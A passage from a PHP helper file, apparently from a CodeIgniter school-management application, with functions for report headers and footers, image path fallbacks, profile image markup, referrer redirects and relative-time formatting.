    $numPadded = sprintf("%02d", $num);
    return $numPadded;
}

function reportheader($setting, $schoolyear, $pdf = FALSE) {
    $data = '';
    $CI = & get_instance();
    if(count($setting) && count($schoolyear)) {
        $data .= '<div class="reportPage-header">';
            if($pdf) {
                $data .= '<span class="header"><img class="logo" src="'.base_url('uploads/images/'.$setting->photo).'"></span>';
            } else {
                $data .= '<span class="header" id="headerImage"><p class="bannerLogo"><img src="'.base_url('uploads/images/'.$setting->photo).'"></p></span>';
            }
            $data .= '<p class="title">'.$setting->sname.'</p>';
            $data .= '<p class="title-desc">'.$setting->address.'</p>';
            $data .= '<p class="title-desc">'.$CI->lang->line('topbar_academic_year'). ' : '.$schoolyear->schoolyear.'</p>';
        $data .= '</div>';
    }
    return $data;
}

function reportfooter($setting, $schoolyear, $pdf = FALSE) {
    $data = '';
    $CI = & get_instance();
    if(count($setting) && count($schoolyear)) {
        $data .= '<div class="footer">';
            $data .= '<img class="flogo" style="width:30px" src="'.base_url("uploads/images/$setting->photo").'">';
            $data .= '<p class="copyright">'.$setting->footer.' | '.$CI->lang->line('topbar_hotline').' : '.$setting->phone.'</p>';
        $data .= '</div>';
    }
    return $data;
}


function featureheader($siteinfos) {
    $CI = & get_instance(); ?>
    <div class="headerArea">
      <div class="siteLogo">
        <img class="siteLogoimg" src="<?=base_url('uploads/images/'.$siteinfos->photo)?>" alt="">
      </div>
      <div class="siteTitle">
        <h2><?=$siteinfos->sname?></h2>
        <address>
            <?=$siteinfos->address?><br/>
            <b><?=$CI->lang->line('topbar_email')?>:</b> <?=$siteinfos->email?><br/>
            <b><?=$CI->lang->line('topbar_phone')?>:</b> <?=$siteinfos->phone?>
        </address>
      </div>
    </div>
    <?php
}

function featurefooter($siteinfos) {
    $CI = & get_instance(); ?>
    <div class="footerArea">
        <img class="flogo" src="<?=base_url('uploads/images/'.$siteinfos->photo)?>" alt="">
        <p class="copyright"><?=$siteinfos->footer?> | <?=$CI->lang->line('topbar_hotline')?><b> : </b><?=$siteinfos->phone?></p>
    </div>
    <?php
}

function lang($line, $for = '', $attributes = array())
{
    $line = get_instance()->lang->line($line);

    if ($for !== '')
    {
        $line = '<label for="'.$for.'"'._stringify_attributes($attributes).'>'.$line.'</label>';
    }

    return $line;
}

if ( ! function_exists('redirect_back')) {
    function redirect_back()
    {
        if (isset($_SERVER['HTTP_REFERER'])) {
            header('Location: ' . $_SERVER['HTTP_REFERER']);
        } else {
            header('Location: http://' . $_SERVER['SERVER_NAME']);
        }
        exit;
    }
}


function imageLinkWithDefatulImage($photoName, $defaultPhotoName = 'default.png', $srcpath = NULL)
{
    $src = '';
    if($srcpath == NULL) {
        if($photoName != NULL) {
            if(file_exists(FCPATH.'uploads/images/'.$photoName)) {
                $src = base_url('uploads/images/'.$photoName);
            } else {
                $src = base_url('uploads/images/'.$defaultPhotoName);
            }
        } else {
            $src = base_url('uploads/images/'.$defaultPhotoName);
        }
    } else {
        if($photoName != NULL) {
            if(file_exists(FCPATH.$srcpath.'/'.$photoName)) {
                $src = base_url($srcpath.'/'.$photoName);
            } else {
                $src = base_url('uploads/images/'.$defaultPhotoName);
            }
        } else {
            $src = base_url('uploads/images/'.$defaultPhotoName);
        }
    }
    return $src;
}

function imagelink($photoname, $srcpath = NULL) {
    $src = '';
    if($srcpath == NULL) {
        if($photoname != NULL) {
            if(file_exists(FCPATH.'uploads/images/'.$photoname)) {
                $src = base_url('uploads/images/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    } else {
        if($photoname != NULL) {
            if(file_exists(FCPATH.$srcpath.'/'.$photoname)) {
                $src = base_url($srcpath.'/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    }
    return $src;
}

function pdfimagelink($photoname, $srcpath = NULL) {
    $src = '';
    if($srcpath == NULL) {
        if($photoname != NULL) {
            if(file_exists(FCPATH.'uploads/images/'.$photoname)) {
                $src = base_url('uploads/images/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    } else {
        if($photoname != NULL) {
            if(file_exists(FCPATH.$srcpath.'/'.$photoname)) {
                $src = base_url($srcpath.'/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    }
    return $src;
}

function profileimage($photoname, $srcpath = NULL) {
    $src = '';
    if($srcpath == NULL) {
        if($photoname != NULL) {
            if(file_exists(FCPATH.'uploads/images/'.$photoname)) {
                $src = base_url('uploads/images/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    } else {
        if($photoname != NULL) {
            if(file_exists(FCPATH.$srcpath.'/'.$photoname)) {
                $src = base_url($srcpath.'/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    }

    $array = array(
        "src" => $src,
        'width' => '50px',
        'height' => '50px',
        'class' => 'img-rounded'
    );
    return img($array);
}

function profileviewimage($photoname, $srcpath = NULL) {
    $src = '';
    if($srcpath == NULL) {
        if($photoname != NULL) {
            if(file_exists(FCPATH.'uploads/images/'.$photoname)) {
                $src = base_url('uploads/images/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    } else {
        if($photoname != NULL) {
            if(file_exists(FCPATH.$srcpath.'/'.$photoname)) {
                $src = base_url($srcpath.'/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    }

    $array = array(
        "src" => $src,
        'class' => 'profile-user-img img-responsive img-circle'
    );
    return img($array);
}

function profileproimage($photoname, $srcpath = NULL) {
    $src = '';
    if($srcpath == NULL) {
        if($photoname != NULL) {
            if(file_exists(FCPATH.'uploads/images/'.$photoname)) {
                $src = base_url('uploads/images/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    } else {
        if($photoname != NULL) {
            if(file_exists(FCPATH.$srcpath.'/'.$photoname)) {
                $src = base_url($srcpath.'/'.$photoname);
            } else {
                $src = base_url('uploads/images/default.png');
            }
        } else {
            $src = base_url('uploads/images/default.png');
        }
    }

    $string = '<a width="35px" height="35px" class="card-image img-rounded" href="#" style="background-image: url('.base_url("uploads/images/default.png").');" data-image-full="'.$src.'"><img class="img-rounded" width="35px" height="35px" src="'.$src.'" alt="Psychopomp" /></a>';
    return $string;

    // $array = array(
    //     "src" => $src,
    //     'width' => '35px',
    //     'height' => '35px',
    //     'class' => 'img-rounded'
    // );
    // return img($array);
}

function profiledeleted($id, $lang) {
    if(!$id) {
        return '<span class="text-red">('.$lang.')';
    }
}


function get_day_using_two_date($fromdate, $todate) {
    $oneday    = 60*60*24;

    $alldays = [];
    for($i=$fromdate; $i<= $todate; $i= $i+$oneday) {
        $alldays[] = date('d-m-Y', $i);
    }
    return $alldays;
}

function random19() {
  $number = "";
  for($i=0; $i<19; $i++) {
    $min = ($i == 0) ? 1:0;
    $number .= mt_rand($min,9);
  }
  return $number;
}

function timelefter($dafstdate) {
    $pdate = date("Y-m-d H:i:s");
    $first_date = new DateTime($dafstdate);
    $second_date = new DateTime($pdate);
    $difference = $first_date->diff($second_date);
    if($difference->y >= 1) {
        $format = 'Y-m-d H:i:s';
        $date = DateTime::createFromFormat($format, $dafstdate);
        return $date->format('M d Y');
    } elseif($difference->m ==1 && $difference->m !=0) {
        return $difference->m . " month ago";
    } elseif($difference->m <=12 && $difference->m !=0) {
        return $difference->m . " months ago";
    } elseif($difference->d == 1 && $difference->d != 0) {
        return "Yesterday";
    } elseif($difference->d <= 31 && $difference->d != 0) {
        return $difference->d . " days ago";
    } else if($difference->h ==1 && $difference->h !=0) {
        return $difference->h . " hr ago";
    } else if($difference->h <=24 && $difference->h !=0) {
        return $difference->h . " hrs ago";
    } elseif($difference->i <= 60 && $difference->i !=0) {
        return $difference->i . " mins ago";
    } elseif($difference->s <= 10) {
        return "Just Now";
    } elseif($difference->s <= 60 && $difference->s !=0) {
        return $difference->s . " sec ago";
    }
}
